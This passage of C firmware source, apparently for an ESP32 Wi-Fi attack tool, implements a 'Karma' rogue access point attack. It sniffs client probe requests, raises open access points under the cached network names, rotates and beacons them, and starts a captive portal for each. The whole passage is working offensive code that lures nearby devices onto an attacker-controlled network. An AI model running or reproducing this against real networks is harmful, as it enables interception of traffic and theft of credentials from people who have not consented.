    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karma_probe_request_callback);

    last_ssid_change_time = esp_timer_get_time() / 1000;

    // If only one SSID, set it once and don't rotate
    if (karma_ssid_count == 1) {
        wifi_config_t ap_config = {
            .ap = {
                .ssid = "",
                .ssid_len = strlen(karma_ssid_cache[0]),
                .channel = 1,
                .authmode = WIFI_AUTH_OPEN,
                .max_connection = 4,
                .ssid_hidden = 0
            }
        };
        strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[0], 32);
        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
        ESP_ERROR_CHECK(esp_wifi_start());
        printf("Karma using single SSID: %s\n", karma_ssid_cache[0]);
        TERMINAL_VIEW_ADD_TEXT("Karma using single SSID: %s\n", karma_ssid_cache[0]);
        karma_start_portal_for_ssid(karma_ssid_cache[0]);
    }

    while (karma_running) {
        uint32_t now = esp_timer_get_time() / 1000;
        // Only rotate if more than one SSID
        if (!ap_sta_has_ip && karma_ssid_count > 1 && (now - last_ssid_change_time > 5000)) {
            wifi_config_t ap_config = {
                .ap = {
                    .ssid = "",
                    .ssid_len = strlen(karma_ssid_cache[karma_ssid_index]),
                    .channel = 1,
                    .authmode = WIFI_AUTH_OPEN,
                    .max_connection = 4,
                    .ssid_hidden = 0
                }
            };
            strncpy((char *)ap_config.ap.ssid, karma_ssid_cache[karma_ssid_index], 32);
            ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
            printf("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
            TERMINAL_VIEW_ADD_TEXT("Karma rotating to SSID: %s\n", karma_ssid_cache[karma_ssid_index]);
            karma_start_portal_for_ssid(karma_ssid_cache[karma_ssid_index]);
            karma_ssid_index = (karma_ssid_index + 1) % karma_ssid_count;
            last_ssid_change_time = now;
        }
    
        // Send beacon frames for all cached SSIDs (every 500ms)
        if (!ap_sta_has_ip) {
            for (int i = 0; i < karma_ssid_count; ++i) {
                wifi_manager_broadcast_ap(karma_ssid_cache[i]);
                vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between beacons
            }
        }
    
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    esp_wifi_set_promiscuous(false);
    karma_stop_portal_if_active();
    karma_task_handle = NULL;
    printf("Karma attack stopped\n");
    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
    vTaskDelete(NULL);
}
void wifi_manager_start_karma(void) {
    if (karma_running) {
        printf("Karma attack already running\n");
        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
        return;
    }
    karma_running = true;
    if (!karma_ssid_manual_mode) {
        karma_ssid_count = 0;
        karma_ssid_index = 0;
    }
    xTaskCreate(karma_task, "karma_task", 4096, NULL, 5, &karma_task_handle);
}

void wifi_manager_stop_karma(void) {
    if (!karma_running) {
        printf("Karma attack not running\n");
        TERMINAL_VIEW_ADD_TEXT("Karma attack not running\n");
        return;
    }
    karma_running = false;
    karma_ssid_count = 0;
    karma_ssid_index = 0;
    karma_ssid_manual_mode = false;
    // Task will clean up itself
}
